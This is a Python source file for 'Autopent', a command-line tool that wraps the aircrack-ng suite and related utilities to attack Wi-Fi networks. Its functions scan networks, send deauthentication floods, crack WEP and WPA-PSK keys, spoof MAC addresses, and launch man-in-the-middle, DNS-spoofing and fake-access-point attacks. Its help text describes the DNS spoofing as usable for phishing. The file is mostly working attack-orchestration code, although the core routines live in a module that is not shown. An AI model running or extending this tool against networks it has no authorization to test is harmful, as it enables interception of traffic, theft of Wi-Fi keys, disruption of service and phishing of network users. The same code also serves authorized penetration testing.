#!/usr/bin/env python3

import re
import os
import shutil
import time
import argparse
from subprocess import call, Popen, PIPE
from tempfile import mkdtemp, mkstemp
from colorama import Fore, Style
from colorama import init as coloramainit

from wlan import Wlan
from helpers import Helpers

#GLOBAL VARIABLES IN ALL_CAPS
WLAN_EXP = re.compile(r'wlan[0-9]{1}')
MON_EXP = re.compile(r'mon[0-9]{1}')
DN = open(os.devnull, 'w')
OUTLOG = open(os.devnull, 'w')
##Console colors
B = Fore.BLUE
R = Fore.RED
G = Fore.GREEN
BR = Style.BRIGHT
RA = Style.RESET_ALL

class Autopent():
    """
    Autopent is a command line tool that englobes pentesting tools for WLAN networks.
    """
    
    def __init__(self, **kwargs):
        coloramainit()
        self.helpers = Helpers()
        self.interface = ''
        self.tmpdir = mkdtemp('autopent')
        if not self.tmpdir.endswith(os.sep):
            self.tmpdir += os.sep
        for name, value in kwargs.items():
            if name == 'wlan' and value == True:
                self.wlan = Wlan(self.tmpdir)
    
    def verify_root(self):
        '''Verify that the tool is run as root user, the UID is verified'''
        if os.getuid() != 0:
            print(R + "    [!] Error: program must be run as root")
            print(R + "    [i] Use " + B + "sudo ./autopent.py"
                    + R + " or login as root by using: " + B + "su root")
            print(RA)
            self.exit_cleanly(1)
        elif os.getuid() == 0:
            pass

    def verify_platform(self):
        '''Be sure that the platform is Linux'''

        if not os.uname()[0].startswith("Linux"):
            print(R + "    [!] Error: Autopent must be run on Linux")
            print(RA)
            self.exit_cleanly(1)

    def verify_tools(self):
        '''Verify the availability of the needed tools on the system'''
        
        tools = ['aircrack-ng', 'airmon-ng', 'aireplay-ng', 'airodump-ng', 
                'packetforge-ng', 'wireshark', 'dnsspoof', 'airbase-ng',
                'brctl', 'ifconfig', 'echo', 'dnsmasq', 'hostapd',
                'dhcpd', 'iptables']
        for tool in tools:
            if self.helpers.check_availability(tool): continue
            print(R + "[!]    Error: program " + B +
                      tool + R + " not found!")
            print(R + "[i]    Try installing the missing program,"
                  " using " + B + "apt-get install <program>" + RA)
            print(R + "[i]    Or run the tool in Kali Linux, as these tools"
                    " come already installed" + RA)
            self.exit_cleanly(1)

    def scan_networks(self, interface, channel):
        '''
        Scans for available networks with the specified interface and 
        channel. It reads the results from the temporary capture file
        '''

        tempfile = mkstemp('autopent', '1', self.tmpdir)
        command = ['airodump-ng', '-a', '-w', tempfile[1]]
        if channel != 0:
            command.append('-c')
            command.append(str(channel))
        command.append(interface)
        (targets, clients) = ([], [])
        try:
            print(B + "[+]    Scanning for networks is running" + RA)
            proc = Popen(command, stdout=DN, stderr=DN)
            print(B + "[+]    Please wait..." + RA)
            time.sleep(20)
            proc.terminate()
            print(B + "[+]    Scanning completed" + RA)
            (targets, clients) = self.helpers.csv_parser1(tempfile[1] + '-01.csv')
            print(B + "[+]    Scan Results: " + RA)
            print()
            print("         NUM  ESSID                   "+
                    "        CH  ENCR  POWER    BSSID")
            for i, t in enumerate(targets):
                print("         {:s}{:2d}{:s}".format(G, i+1, RA), end="  ")
                print(" {:s}{:30s}{:s}".format(B, t.ssid, RA), end="  ")
                print("{:s}{:2s}{:s}".format(B, t.channel, RA), end="   ")
                print("{:s}{:4s}{:s}".format(B, t.encryption, RA), end="  ")
                print("{:s}{:2d}{:s}".format(G, t.power, RA), end="     ")
                print("{:s}{:s}{:s}".format(B, t.bssid, RA))
            print()
            self.exit_cleanly(0)
        except KeyboardInterrupt:
            print(R + "[!]    Caught interruption, will stop..." + RA)
            proc.terminate()
            self.exit_cleanly(1)

    def discover_clients(self, bssid, channel, interface):
        '''
        Launches packet injection attack on AP to determine connected
        clients, then displays a list of connected clients
        '''

        capfile = mkstemp('autopent', 'dump', self.tmpdir)
        command = ['airodump-ng', '-c', channel, '-d', bssid, '-w',
                   capfile[1], interface]
        clients = []
        print(B + "[+]    Discovering clients is running" + RA)
        try:
            proc = Popen(command, stdout=DN, stderr=DN)
            print(B + "[+]    Please wait..." + RA)
            time.sleep(20)
            proc.terminate()
            clients = (self.helpers.csv_parser2(capfile[1] + '-01.csv'))
            if clients:
                print(B + "[+]    Connected clients: " + RA)
                print()
                print("         NUM  MAC                POWER  AP")
                for i, c in enumerate(clients):
                    print("         {:s}{:2d}{:s}".format(G, i+1, RA), 
                            end="   ")
                    print("{:s}{:s}{:s}".format(B, c.bssid, RA), end="  ")
                    print("{:s}{:3d}{:s}".format(G, c.power, RA), end="    ")
                    print("{:s}{:s}{:s}".format(B, c.station, RA))
                print()
                self.exit_cleanly(0)
            elif not clients:
                print(R + "[!]    Got no clients, try restarting discovery"+ RA)
                self.exit_cleanly(1)
        except KeyboardInterrupt:
            print(R + "[!]    Caught interruption, will stop..." + RA)
            proc.terminate()
            self.exit_cleanly(1)
    
    def exit_cleanly(self, code):
        '''Deletes the temporary directory and files within it'''
        
        shutil.rmtree(self.tmpdir, ignore_errors=True)
        exit(code)

    def activate_mon(self, interface='wlan0'):
        '''Activate monitor mode on network interface'''
        
        try:
            print(B + "[+]    Killing all annoying processes..." + RA)
            call(['airmon-ng', 'check', 'kill'], stdout=DN, stderr=DN)
            print(B + "[+]    Activating Monitor mode..." + RA)
            call(['airmon-ng' ,'start', interface], stdout=DN, stderr=DN)
        except OSError as e:
            print(R + "[!]    Error activating monitor mode" + RA)
            print("Command execution failed: ", e)
            self.exit_cleanly(1)
        finally:
            print(B + "[+]    Monitor mode activated successfully" + RA)

    def deactivate_mon(self, interface='mon0'):
        '''Deactivate monitor mode on network inteface'''
        
        try:
            print(B + "[+]    Deactivating Monitor mode..." + RA)
            call(['airmon-ng', 'stop' , interface], stdout=DN, stderr=DN)
        except OSError as e:
            print(R + "[!]    Error deactivating monitor mode" + RA)
            print("Command execution failed: ", e)
            self.exit_cleanly(1)
        finally:
            print(B + "[+]    Monitor mode deactivated successfully" + RA)

    def handle_args(self):
        '''Handles command line arguments'''
        
        opts_parser = self.options_parser()
        options = opts_parser.parse_args()
        try:
            if options.helpmenu:
                self.banner()
                self.exit_cleanly(0)
            if options.intface:
                if WLAN_EXP.fullmatch(options.intface):
                    self.interface = options.intface
                elif MON_EXP.fullmatch(options.intface):
                    self.interface = options.intface
                else:
                    self.interface = options.intface
            if options.bssid:
                if not self.helpers.check_mac(options.bssid):
                    print(self.helpers.args_error(bssid=False))
                    self.exit_cleanly(1)
                else:
                   pass
            if options.bssidc:
                if not self.helpers.check_mac(options.bssidc):
                    print(self.helpers.args_error(bssidc=False))
                    self.exit_cleanly(1)
                else:
                    pass
            if options.macaddr:
                if not self.helpers.check_mac(options.macaddr):
                    print(self.helpers.args_error(macaddr=False))
                    self.exit_cleanly(1)
                else:
                    pass
            if options.scan:
                if self.interface != '' and options.ch != 99:
                    self.scan_networks(self.interface, options.ch)
                elif self.interface != ''and options.ch == 99:
                    self.scan_networks(self.interface, 0)
                else:
                    if options.ch == None:
                        print(self.helpers.args_error(channel=False))
                    if self.interface == '':
                        print(self.helpers.args_error(interface=False))
                    self.exit_cleanly(1)
            if options.deauth:
                proc = None
                if self.interface != '' and options.bssid:
                    print(B + "[+]    Sending deauth packets to AP/client" + RA)
                    print(B + "[+]    Please wait..." + RA)
                    if options.bssidc and self.helpers.check_mac(options.bssidc):
                        try:
                            proc = self.wlan.deauth_clients(options.bssid, 
                                self.interface, options.bssidc)
                            time.sleep(25)
                            proc.terminate()
                            print(B + "[+]    Attack done successfully" + RA)
                        except KeyboardInterrupt:
                            print(R + "[!]    Caught interruption, will stop..."
                                    + RA)
                            if proc:
                                proc.terminate()
                            self.exit_cleanly(1)
                    elif not options.bssidc:
                        try:
                            self.wlan.deauth_clients(options.bssid, 
                                self.interface, 0)
                            time.sleep(25)
                            if proc:
                                proc.terminate()
                            print(B + "[+]    Attack done successfully" + RA)
                        except KeyboardInterrupt:
                            print(R + "[!]    Caught interruption, will stop..."
                                    + RA)
                            self.exit_cleanly(1)
                    self.exit_cleanly(0)
                elif options.bssid == None:
                    print(self.helpers.args_error(bssid=False))
                elif self.interface == '':
                    print(self.helpers.args_error(interface=False))
                self.exit_cleanly(1)
            if options.discoverc:
                if options.bssid and options.ch and self.interface != '':
                    self.discover_clients(options.bssid, str(options.ch), 
                        self.interface)
                else:
                    if options.bssid == None:
                        print(self.helpers.args_error(bssid=False))
                    if options.ch == None:
                        print(self.helpers.args_error(channel=False))
                    if options.intface == None:
                        print(self.helpers.args_error(interface=False))
                    self.exit_cleanly(1)
            if options.changemac:
                proc = None
                if options.macaddr and self.interface != '':
                    if self.helpers.check_mac(options.macaddr):
                        try:
                            print(B + "[+]    Changing MAC to the address "
                                    + G + " {:s}".format(options.macaddr) + RA)
                            proc = self.wlan.change_mac(options.macaddr, 
                                    self.interface)
                            time.sleep(8)
                            proc.terminate()
                            print(B + "[+]    Please wait..." + RA)
                            print(B + "[+]    Operation done successfully" + RA)
                            self.exit_cleanly(0)
                        except KeyboardInterrupt:
                            print(R + "[!]    Caught interruption,"
                                    " will stop..." + RA)
                            if proc:
                                proc.terminate()
                            self.exit_cleanly(1)
                else:
                    if options.macaddr == None:
                        print(self.helpers.args_error(macaddr=False))
                    if self.interface == '':
                        print(self.helpers.args_error(interface=False))
                    self.exit_cleanly(1)
            if options.enmon:
                if options.intface != None:
                    self.activate_mon(self.interface)
                elif self.interface == '' or options.intface == None:
                    print(self.helpers.args_error(interface=False))
                    self.exit_cleanly(1)
            if options.dismon:
                if options.intface != None:
                    self.deactivate_mon(self.interface)
                elif self.interface == '' or options.intface == None:
                    print(self.helpers.args_error(interface=False))
                    self.exit_cleanly(1)
            if options.wepcrack:
                procs = None
                if options.bssid and options.ch:
                    if options.bssidc and options.intface:
                        try:
                            print(B + "[+]    Cracking the WEP key is running" 
                                    + RA)
                            print(B + "[+]    Please wait..." + RA)
                            procs = self.wlan.crack_wep(str(options.bssid), 
                                    str(options.ch), str(options.bssidc),
                                    str(options.intface))
                            cap = procs['cap']
                            cap = str(procs['cap'] + "-01.cap")
                            time.sleep(30)
                            crack = call(['aircrack-ng', cap], stderr=DN)
                        except KeyboardInterrupt:
                            print(R + "[!]    Caught interruption, "
                                    "will stop..." + RA)
                            if procs:
                                procs['proc1'].terminate()
                                procs['proc2'].terminate()
                            self.exit_cleanly(1)
                else:
                    if options.bssid == None:
                        print(self.helpers.args_error(bssid=False))
                    if options.ch == None:
                        print(self.helpers.args_error(channel=False))
                    if options.bssidc == None:
                        print(self.helpers.args_error(bssidc=False))
                    if options.intface == None:
                        print(self.helpers.args_error(interface=False))
                    self.exit_cleanly(1)
            if options.wpacrack:
                procs = None
                dictionary = './dictionary'
                if options.bssid and options.intface and options.ch:
                    try:
                        print(B + "[+]    Cracking the WPA-PSK key is running" 
                                + RA)
                        print(B + "[+]    Please wait..." + RA) 
                        procs = self.wlan.crack_wpapsk(str(options.bssid), 
                                str(options.ch), str(options.intface))
                        cap = str(procs['cap'] + "-01.cap")
                        time.sleep(30)
                        crack = call(['aircrack-ng', cap, '-w', dictionary], 
                                stderr=DN)
                    except KeyboardInterrupt:
                        print(R + "[!]    Caught interruption, will stop..." 
                                + RA)
                        if procs:
                            procs['proc1'].terminate()
                            procs['proc2'].terminate()
                        self.exit_cleanly(1)

                else:
                    if options.bssid == None:
                        print(self.helpers.args_error(bssid=False))
                    if options.ch == None:
                        print(self.helpers.args_error(channel=False))
                    if options.intface == None:
                        print(self.helpers.args_error(interface=False))
                    self.exit_cleanly(1)
            if options.mitm:
                procs = None
                if options.bssid and options.essid and options.ch:
                    if options.intface:
                        try:
                            print(B + "[+]    Launching the MITM attack " + RA)
                            print(B + "[+]    Creating interfaces and"
                                    " configuring the system" + RA)
                            print(B + "[+]    Please wait..." + RA)
                            procs = self.wlan.mitm(str(options.bssid), 
                                    str(options.essid), str(options.ch), 
                                    str(self.interface))
                            print()
                        except KeyboardInterrupt:
                            print(R + "[!]    Caught interruption, will stop..." 
                                    + RA)
                            print(R + "[!]    Cleaning and restoring system"
                                    " configuration..." + RA)
                            if procs:
                                print(R + "[!]    Cleaning and restoring system"
                                        " configuration..." + RA)
                                for process in procs:
                                    proc.terminate()
                            call(['echo', '0' , '>',
                                '/proc/sys/net/ipv4/ip_forward'], stdout=DN,
                                stderr=DN)
                            call(['ifconfig', 'eth0', 'down'], stdout=DN, 
                                stderr=DN)
                            call(['ifconfig', 'at0', 'down'], stdout=DN, 
                                stderr=DN)
                            call(['ifconfig', 'mitm-bridge', 'down'], 
                                stdout=DN,stderr=DN)
                            call(['brctl', 'delif', 'mitm-bridge', 'eth0'],
                                stdout=DN, stderr=DN)
                            call(['brctl', 'delif', 'mitm-bridge', 'at0'],
                                    stdout=DN, stderr=DN)
                            call(['brctl', 'delbr', 'mitm-bridge'], stdout=DN,
                                    stderr=DN)
                            self.exit_cleanly(1)
                else:
                    if options.bssid == None:
                        print(self.helpers.args_error(bssid=False))
                    if options.essid == None:
                        print(self.helpers.args_error(essid=False))
                    if options.ch == None:
                        print(self.helpers.args_error(channel=False))
                    if options.intface == None:
                        print(self.helpers.args_error(interface=False))
                    self.exit_cleanly(1)
            if options.dnsspoof:
                procs = None
                if options.bssid and options.essid and options.intface:
                    if options.ch:
                        try:
                            print(B + "[+]    Launching the DNS spoofing attack "
                                    + RA)
                            print(B + "[+]    Creating interfaces and "
                                    "configuring the system" + RA)
                            print(B + "[+]    Please wait..." + RA)
                            procs = self.wlan.mitm(str(options.bssid), 
                                    str(options.essid), str(options.ch), 
                                    str(self.interface), True)
                            print()
                        except KeyboardInterrupt:
                            print(R + "[!]    Caught interruption, will stop..."
                                    + RA)
                            print(R + "[!]    Cleaning and restoring system"
                                    " configuration..." + RA)
                            if procs:
                                for process in procs:
                                    process.terminate()
                            call(['echo', '0' , '>', 
                                '/proc/sys/net/ipv4/ip_forward'], stdout=DN, 
                                stderr=DN)
                            call(['ifconfig', 'eth0', 'down'], stdout=DN,
                                stderr=DN)
                            call(['ifconfig', 'at0', 'down'], stdout=DN, 
                                    stderr=DN)
                            call(['ifconfig', 'mitm-bridge', 'down'], stdout=DN,
                                    stderr=DN)
                            call(['brctl', 'delif', 'mitm-bridge', 'eth0'], 
                                    stdout=DN, stderr=DN)
                            call(['brctl', 'delif', 'mitm-bridge', 'at0'], 
                                    stdout=DN, stderr=DN)
                            call(['brctl', 'delbr', 'mitm-bridge'], stdout=DN,
                                    stderr=DN)
                            self.exit_cleanly(1)
                else:
                    if options.bssid == None:
                        print(self.helpers.args_error(bssid=False))
                    if options.essid == None:
                        print(self.helpers.args_error(essid=False))
                    if options.ch == None:
                        print(self.helpers.args_error(channel=False))
                    if options.macaddr == None:
                        print(self.helpers.args_error(macaddr=False))
                    if options.intface == None:
                        print(self.helpers.args_error(interface=False))
                    self.exit_cleanly(1)
            if options.eviltween:
                procs = None
                if options.essid and options.bssid and options.intface:
                    if options.ch:
                        try:
                            print(B + "[+]    Launching the Evil Tween attack "
                                    + RA)
                            print(B + "[+]    Creating interfaces and " 
                                    "configuring the system" + RA)
                            print(B + "[+]    Please wait..." + RA)
                            procs = self.wlan.evil_tween(str(options.bssid), 
                                    str(options.essid), str(options.ch), 
                                    str(options.intface))
                            print()
                        except KeyboardInterrupt:
                            print(R + "[!]    Caught interruption, will stop..." 
                                    + RA)
                            print(R + "[!]    Cleaning and restoring system"
                                    " configuration..." + RA)
                            if procs:
                                for process in procs:
                                    process.terminate()
                            call(['echo', '0' , '>',
                                '/proc/sys/net/ipv4/ip_forward'], stdout=DN,
                                stderr=DN)
                            call(['ifconfig', 'eth0', 'down'], stdout=DN,
                                    stderr=DN)
                            call(['ifconfig', 'at0', 'down'], stdout=DN, 
                                    stderr=DN)
                            call(['ifconfig', 'mitm-bridge', 'down'], stdout=DN,
                                    stderr=DN)
                            call(['brctl', 'delif', 'mitm-bridge', 'eth0'], 
                                    stdout=DN, stderr=DN)
                            call(['brctl', 'delif', 'mitm-bridge', 'at0'], 
                                    stdout=DN, stderr=DN)
                            call(['brctl', 'delbr', 'mitm-bridge'], stdout=DN, 
                                    stderr=DN)
                            self.exit_cleanly(1)
                else:
                    if options.essid == None:
                        print(self.helpers.args_error(essid=False))
                    if options.bssid == None:
                        print(self.helpers.args_error(bssid=False))
                    if options.ch == None:
                        print(self.helpers.args_error(channel=False))
                    if options.intface == None:
                        print(self.helpers.args_error(interface=False))
                    self.exit_cleanly(1)

            else:
                try:
                    self.exit_cleanly(0)
                except FileNotFoundError:
                    pass
        except IndexError:
            print(R, "[!]    Option Error")
            self.exit_cleanly(1)

    def options_parser(self):
        '''Defines command line options'''
        
        option_parser = argparse.ArgumentParser(description='Autopent is a '
                 'command line tool that englobes networks pentesting tools',
                 add_help=False)
        intfacegroup = option_parser.add_mutually_exclusive_group()
        actiongroup = option_parser.add_mutually_exclusive_group()
        option_parser.add_argument('-h', '--help', action='store_true', 
                dest='helpmenu')
        option_parser.add_argument('-b', '--bssid', help='BSSID of the AP to'
                ' attack', action='store', dest='bssid', type=str)
        option_parser.add_argument('-bc', '--bssid-client', help='BSSID of the'
                ' client to attack', action='store', dest='bssidc', type=str)
        option_parser.add_argument('-ed', '--essid', dest='essid', type=str,
                help='ESSID of the AP to attack/imitate')
        option_parser.add_argument('-c', '--channel', help='channel to scan '
                'for available targets', action='store', dest='ch', 
                type=int, choices=([1,2,3,4,5,6,7,8,9,10,11,99]))
        option_parser.add_argument('-i', '--interface', help='network'
                ' interface', action='store', dest='intface', type=str)
        intfacegroup.add_argument('-e', '--enable-mon', help='enables monitor'
                'mode on the given network interface', 
                action='store_true', dest='enmon')
        intfacegroup.add_argument('-d', '--disable-mon', help='disables'
                ' monitor mode on the given network interface', 
                action='store_true', dest='dismon')
        actiongroup.add_argument('-s', '--scan', action='store_true', help=\
                'scans for available networks with clients', dest='scan')
        actiongroup.add_argument('-dc', '--discover-clients', action=\
                'store_true', dest='discoverc', help='discovers clients'
                ' connected to a network')
        actiongroup.add_argument('-sd', '--send-deauth', dest='deauth', help=\
                'sends deauth packets to the specified AP', action='store_true')
        
        wireless_group = option_parser.add_argument_group('Wireless')
        wireless_group.add_argument('-ce', '--crack-wep', help='launches a '
                'WEP key cracking attack', dest='wepcrack', action='store_true')
        wireless_group.add_argument('-cm', '--change-mac', help='changes MAC'
                ' address to the given one, interface and MAC address must be'
                ' specified using the -i and -m options respectively',
                action='store_true', dest='changemac')
        wireless_group.add_argument('-m', '--mac', help='specifies the MAC'
                ' address to use', dest='macaddr', action='store',
                type=str)
        wireless_group.add_argument('-ds', '--dns-spoof', help='spoofs DNS'
                ' requests', dest='dnsspoof', action='store_true')
        wireless_group.add_argument('-it', '--mitm', help='launches a MITM'
                ' attack', dest='mitm', action='store_true')
        wireless_group.add_argument('-ca', '--crack-wpapsk', help='launches a '
                'WPA key cracking attack', action='store_true', dest='wpacrack')
        wireless_group.add_argument('-ev', '--evil-tween', help='launches an'
                ' evil tween - fake AP attack', action='store_true', 
                dest='eviltween')

        lan_group = option_parser.add_argument_group('LAN')
        lan_group.add_argument('-sl' ,'--spoof-lan', help='launches a spoof'
                ' attack on LAN network')

        return option_parser

    def banner(self):
        '''Displays ASCII art and help menu of this pentesting tool'''
        
        print(BR, G)
        print("    _______       _____                          _____ ")
        print("    ___    |___  ___  /____________________________  / ")
        print("    __  /| |  / / /  __/  __ \__  __ \  _ \_  __ \  __/")
        print("    _  ___ / /_/ // /_ / /_/ /_  /_/ /  __/  / / / /   ")
        print("    /_/  |_\__,_/ \__/ \____/_  .___/\___//_/ /_/\__/  ")
        print("                             /_/                       ")
        print(B, "              Author: Youssef Seddik        " + RA)
        print(BR + 
                "  OPTIONS                                            ")
        print("      -h, --help                                       ")
        print(RA + 
                "         prints this help message                     ")
        print(BR + "      -b, --bssid " + RA + "<bssid>")
        print(RA + 
                "         BSSID of the AP to attack")
        print(BR + "      -bc, --bssid-client" + RA + "<bssid>")
        print(RA + 
                "         BSSID of the client to attack")
        print(BR + "      -c, --channel " + RA + "<channel>")
        print(RA + 
                "         fixes the channel to scan for available targets,\n"
                "         if a 99 is specified, then the scan will be made" 
                " in all channels")
        print(BR + "      -cm, --change-mac " + RA + "<mac_address>")
        print(RA + 
                "         changes MAC address to the given one, interface and\n"
                "         MAC address must be specified using the -i and -m"
                " options respectively")
        print(BR + "      -s, --scan ")
        print(RA + 
                "         scans for networks with clients connected to them,"
                "\n        then it displays a list of found networks")
        print(BR + "      -dc, --discover-clients ")
        print(RA + 
                "         discovers clients connected to a network ")
        print(BR + "      -i, --interface " + RA + "<interface>")
        print(RA + 
                "         specifies the networking interface to be used," 
                "\n        which must be in monitor mode, example: mon0")
        print(BR + "      -e, --enable-mon " + RA + "<interface> ")
        print(RA + 
                "         enables monitor mode on the given network interface")
        print(BR + "      -d, --disable-mon "  + RA + "<interface> ")
        print(RA+ 
                "         disables monitor mode on the given network interface")
        print(BR +
                "  ATTACKS                                            ")
        print(BR + "      -sd, --send-deauth ")
        print(RA +
                "         sends deauth packets to the specified AP")

        print(BR + "      -ev, --evil-tween                                ")
        print(RA + 
                "         launches an evil tween - fake AP attack      ")
        print(BR + "      -ce, --crack-wep                                 ")
        print(RA +
                "         launches a WEP key cracking attack            ")
        print(BR + "      -ca, --crack-wpapsk                            ")
        print(RA + 
                "         launches a WPA-PSK key cracking attack          ")
        print(BR + "      -it, --mitm                            ")
        print(RA +
                "         launches a MITM attack          ")
        print(BR + "      -ds, --dns-spoof                               ")
        print(RA + 
                "         launches a DNS spoofing attack, directing victim \n"
                "         to fake sites created by attacker, can be used for\n"
                "         phishing, fake routes/hosts must be defined in a \n"
                "         hosts text file")
        print(RA)

if __name__ == "__main__":
    pent = Autopent(wlan=True)
    pent.verify_root()
    pent.verify_platform()
    pent.verify_tools()
    pent.handle_args()

